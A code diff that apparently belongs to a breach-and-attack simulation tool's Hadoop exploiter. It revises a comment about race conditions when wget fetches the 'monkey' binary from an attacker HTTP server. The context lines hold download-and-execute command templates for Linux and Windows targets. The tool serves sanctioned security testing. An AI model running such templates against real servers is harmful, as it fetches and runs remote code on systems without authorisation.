@@ -52,10 +52,18 @@ HADOOP_WINDOWS_COMMAND = (
     " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
     '{& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
 )
-# The hadoop server may request another monkey executable
-# which results with a zero-size file which needs to be removed,
-# this can lead to a race condition when the command is run twice
-# so we are adding a 5 seconds sleep to prevent that
+# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
+# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
+# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
+# eachother (one will fail and the other will succeed).
+#
+# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
+# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
+# concurrently running wget and then removes the file if it is still zero-length after the sleep.
+#
+# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
+# practical purposes. In the future, using randomized names for the monkey binary (which is a good
+# practice anyway) would eleminate most of these issues.
 HADOOP_LINUX_COMMAND = (
     "wget --no-clobber -O %(monkey_path)s %(http_path)s "
     "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
